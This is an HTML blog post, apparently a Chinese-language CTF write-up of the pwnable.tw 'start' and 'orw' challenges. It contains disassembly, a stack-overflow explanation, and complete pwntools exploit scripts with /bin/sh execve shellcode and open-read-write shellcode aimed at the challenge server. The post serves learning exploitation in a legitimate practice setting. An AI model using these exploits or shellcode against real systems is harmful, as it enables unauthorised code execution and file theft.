@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>pwnable尝试 | ch4ser の 超元域</title>
+<meta name="keywords" content="">
+<meta name="description" content="尝试学pwn,放弃学pwn">
+<meta name="author" content="ch4ser">
+<link rel="canonical" href="https://dragonbox.top/posts/sec-pwnable/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b0d06c5737380c23b4a5533e5a5e7582f84d35216f212d68a9bb5c197484e3ae.css" integrity="sha256-sNBsVzc4DCO0pVM&#43;Wl51gvhNNSFvIS1oqbtcGXSE464=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="https://dragonbox.top/flash.ico">
+<link rel="apple-touch-icon" href="https://dragonbox.top/flash.ico">
+<link rel="mask-icon" href="https://dragonbox.top/flash.ico">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://dragonbox.top/posts/sec-pwnable/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://dragonbox.top/posts/sec-pwnable/">
+  <meta property="og:site_name" content="ch4ser の 超元域">
+  <meta property="og:title" content="pwnable尝试">
+  <meta property="og:description" content="尝试学pwn,放弃学pwn">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-01-27T17:48:33+00:00">
+    <meta property="article:modified_time" content="2022-01-27T17:48:33+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable尝试">
+<meta name="twitter:description" content="尝试学pwn,放弃学pwn">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://dragonbox.top/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "pwnable尝试",
+      "item": "https://dragonbox.top/posts/sec-pwnable/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "pwnable尝试",
+  "name": "pwnable尝试",
+  "description": "尝试学pwn,放弃学pwn\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "尝试学pwn,放弃学pwn\nstart 下载, 反编译获得如下代码\n.text:08048060 public _start .text:08048060 _start proc near ; DATA XREF: LOAD:08048018↑o .text:08048060 push esp .text:08048061 push offset _exit .text:08048066 xor eax, eax .text:08048068 xor ebx, ebx .text:0804806A xor ecx, ecx .text:0804806C xor edx, edx .text:0804806E push ':FTC' .text:08048073 push ' eht' .text:08048078 push ' tra' .text:0804807D push 'ts s' .text:08048082 push 2774654Ch .text:08048087 mov ecx, esp ; addr .text:08048089 mov dl, 14h ; len .text:0804808B mov bl, 1 ; fd .text:0804808D mov al, 4 .text:0804808F int 80h ; LINUX - sys_write .text:08048091 xor ebx, ebx .text:08048093 mov dl, 3Ch ; '\u003c' .text:08048095 mov al, 3 .text:08048097 int 80h ; LINUX - .text:08048099 add esp, 14h .text:0804809C retn .text:0804809C _start endp ; sp-analysis failed esp压栈, 返回地址压栈 清空了eax, ebx, ecx, edx 四次push压入字符串 Let’s start the CTF : 将栈顶地址作为参数移到ecx中 将20移到dl (edx的低八位)中, 20 就是上面字符串的长度 sys_write将要向stdout写入, 所以将1移动到bl (ebx的低8位)中 因为要调用的系统调用为sys_write, 所以将其系统呼叫号也就是4移动到al (eax的低八位)中 使用 int 80h 来调用中断, 相当于call, 参数为前面的那些, 至此标准输出中写入了字符串 ebx置0, 表示从标准输入中读取 将60传入edx, 表示读取60个字节 (注意这些字节会覆盖原先栈中的字符串) 系统呼叫号置3, 表示使用sys_read调用 int 80h来调用中断, 将内容读入ecx中的地址也就是栈顶中 将esp增加20字节 弹栈并执行弹出地址所指向的指令 攻击思路为:\n程序向栈中写入数据, 然后再将esp增加20然后弹栈执行, 但是我们读取的数据最大有60字节, 那么可以读入超过20字节的数据, 并控制弹栈执行的指令. 如果让弹出执行的指令为sys_write部分的代码, 那么就会泄漏最开始压栈的esp地址 泄漏esp地址之后, 进行第二次攻击, 同样是弹出执行sys_write, 接着代码继续执行到sys_read, 这里让程序读入20个垃圾字符, 接下来程序会将esp增加20, 然后再次弹栈执行, 这次弹栈出来要执行的指令的地址 应该是shellcode的地址, 那么shellcode的地址应该是多少呢? 应该是最开始的esp地址加上20, 这里我第一次看的时候想了好久, 可以看这位师傅的图帮助理解https://xuanxuanblingbling.github.io/ctf/pwn/2019/08/30/start/ exp如下\nfrom pwn import * p = remote('chall.pwnable.tw', 10000) # p = process('./start') shellcode= '\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80' pad = 'a'*20 # pad = pad.decode('utf8') addr = 0x8048087 payload1 = pad + p32(addr).decode('unicode_escape') p.send(payload1) p.recvuntil(\":\") oldesp = u32(p.recv(4)) shellcode_addr = oldesp + 20 payload2 = pad + p32(shellcode_addr).decode('unicode_escape') + shellcode p.send(payload2) p.interactive() orw 逆向得到源代码\nint __cdecl main(int argc, const char **argv, const char **envp) { orw_seccomp(); printf(\"Give my your shellcode:\"); read(0, \u0026shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0; } orw_seccomp 说是限制执行的函数的, 题目说只能执行sys_open sys_read sys_write. 然后接下来程序读取了shellcode并且执行. 所以向程序发送asm代码, 先对flag文件使用sys_open, 然后用sys_read读取内容, 最后使用sys_write 将内容写到标准输出中.\nfrom pwn import * context(arch='i386',os='linux') #context(log_level='debug') io = remote('chall.pwnable.tw',10001) open_code = ''' mov eax, 0x5; push 0x00006761; push 0x6c662f77; push 0x726f2f65; push 0x6d6f682f; mov ebx,esp; xor ecx,ecx; xor edx,edx; int 0x80; ''' read_code = ''' mov ecx, ebx; mov ebx, eax; mov eax, 0x3; mov edx, 0x60; int 0x80; ''' write_code = ''' mov eax, 0x4; mov ebx, 0x1; int 0x80; ''' payload = asm(open_code+read_code+write_code) io.recvuntil(':') io.send(payload) io.interactive() ",
+  "wordCount" : "334",
+  "inLanguage": "en",
+  "datePublished": "2022-01-27T17:48:33Z",
+  "dateModified": "2022-01-27T17:48:33Z",
+  "author":{
+    "@type": "Person",
+    "name": "ch4ser"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://dragonbox.top/posts/sec-pwnable/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "ch4ser の 超元域",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://dragonbox.top/flash.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://dragonbox.top/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
+                <img src="https://dragonbox.top/avatar.jpg" alt="" aria-label="logo"
+                    height="35">ch4ser の 超元域</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://dragonbox.top/categories/" title="categories">
+                    <span>categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://dragonbox.top/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="https://dragonbox.top/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      pwnable尝试
+    </h1>
+    <div class="post-meta"><span title='2022-01-27 17:48:33 +0000 UTC'>January 27, 2022</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;334 words&nbsp;·&nbsp;ch4ser
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#start">start</a></li>
+    <li><a href="#orw">orw</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>尝试学pwn,放弃学pwn</p>
+<h2 id="start">start<a hidden class="anchor" aria-hidden="true" href="#start">#</a></h2>
+<p>下载, 反编译获得如下代码</p>
+<pre tabindex="0"><code>.text:08048060                 public _start
+.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o
+.text:08048060                 push    esp
+.text:08048061                 push    offset _exit
+.text:08048066                 xor     eax, eax
+.text:08048068                 xor     ebx, ebx
+.text:0804806A                 xor     ecx, ecx
+.text:0804806C                 xor     edx, edx
+.text:0804806E                 push    &#39;:FTC&#39;
+.text:08048073                 push    &#39; eht&#39;
+.text:08048078                 push    &#39; tra&#39;
+.text:0804807D                 push    &#39;ts s&#39;
+.text:08048082                 push    2774654Ch
+.text:08048087                 mov     ecx, esp        ; addr
+.text:08048089                 mov     dl, 14h         ; len
+.text:0804808B                 mov     bl, 1           ; fd
+.text:0804808D                 mov     al, 4
+.text:0804808F                 int     80h             ; LINUX - sys_write
+.text:08048091                 xor     ebx, ebx
+.text:08048093                 mov     dl, 3Ch ; &#39;&lt;&#39;
+.text:08048095                 mov     al, 3
+.text:08048097                 int     80h             ; LINUX -
+.text:08048099                 add     esp, 14h
+.text:0804809C                 retn
+.text:0804809C _start          endp ; sp-analysis failed
+</code></pre><ol>
+<li>esp压栈, 返回地址压栈</li>
+<li>清空了eax, ebx, ecx, edx</li>
+<li>四次push压入字符串 Let’s start the CTF :</li>
+<li>将栈顶地址作为参数移到ecx中</li>
+<li>将20移到dl (edx的低八位)中, 20 就是上面字符串的长度</li>
+<li>sys_write将要向stdout写入, 所以将1移动到bl (ebx的低8位)中</li>
+<li>因为要调用的系统调用为sys_write, 所以将其系统呼叫号也就是4移动到al (eax的低八位)中</li>
+<li>使用 int 80h 来调用中断, 相当于call, 参数为前面的那些, 至此标准输出中写入了字符串</li>
+<li>ebx置0, 表示从标准输入中读取</li>
+<li>将60传入edx, 表示读取60个字节 (注意这些字节会覆盖原先栈中的字符串)</li>
+<li>系统呼叫号置3, 表示使用sys_read调用</li>
+<li>int 80h来调用中断, 将内容读入ecx中的地址也就是栈顶中</li>
+<li>将esp增加20字节</li>
+<li>弹栈并执行弹出地址所指向的指令</li>
+</ol>
+<p>攻击思路为:</p>
+<ul>
+<li>程序向栈中写入数据, 然后再将esp增加20然后弹栈执行, 但是我们读取的数据最大有60字节, 那么可以读入超过20字节的数据, 并控制弹栈执行的指令. 如果让弹出执行的指令为sys_write部分的代码, 那么就会泄漏最开始压栈的esp地址</li>
+<li>泄漏esp地址之后, 进行第二次攻击, 同样是弹出执行sys_write, 接着代码继续执行到sys_read, 这里让程序读入20个垃圾字符, 接下来程序会将esp增加20, 然后再次弹栈执行, 这次弹栈出来要执行的指令的地址 应该是shellcode的地址, 那么shellcode的地址应该是多少呢? 应该是最开始的esp地址加上20, 这里我第一次看的时候想了好久, 可以看这位师傅的图帮助理解https://xuanxuanblingbling.github.io/ctf/pwn/2019/08/30/start/</li>
+</ul>
+<p>exp如下</p>
+<pre tabindex="0"><code>from pwn import *
+p = remote(&#39;chall.pwnable.tw&#39;, 10000)
+# p = process(&#39;./start&#39;)
+shellcode= &#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;
+
+pad = &#39;a&#39;*20
+# pad = pad.decode(&#39;utf8&#39;)
+addr = 0x8048087
+payload1 = pad + p32(addr).decode(&#39;unicode_escape&#39;)
+p.send(payload1)
+p.recvuntil(&#34;:&#34;)
+oldesp = u32(p.recv(4))
+shellcode_addr = oldesp + 20
+payload2 = pad + p32(shellcode_addr).decode(&#39;unicode_escape&#39;) + shellcode
+p.send(payload2)
+p.interactive()
+</code></pre><h2 id="orw">orw<a hidden class="anchor" aria-hidden="true" href="#orw">#</a></h2>
+<p>逆向得到源代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">orw_seccomp</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Give my your shellcode:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="mh">0xC8u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">shellcode</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>orw_seccomp 说是限制执行的函数的, 题目说只能执行sys_open sys_read sys_write. 然后接下来程序读取了shellcode并且执行. 所以向程序发送asm代码, 先对flag文件使用sys_open, 然后用sys_read读取内容, 最后使用sys_write 将内容写到标准输出中.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context(log_level=&#39;debug&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chall.pwnable.tw&#39;</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">open_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov eax, 0x5; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x00006761; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x6c662f77; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x726f2f65; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x6d6f682f; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov ebx,esp; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">xor ecx,ecx; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">xor edx,edx; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov ecx, ebx; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov ebx, eax;
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov eax, 0x3; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov edx, 0x60; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov eax, 0x4; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov ebx, 0x1; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">open_code</span><span class="o">+</span><span class="n">read_code</span><span class="o">+</span><span class="n">write_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://dragonbox.top/posts/gossip-2021-summary/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>2021年度总结</span>
+  </a>
+  <a class="next" href="https://dragonbox.top/posts/sec-shiro-attack/">
+    <span class="title">Next »</span>
+    <br>
+    <span>shiro 漏洞复现</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
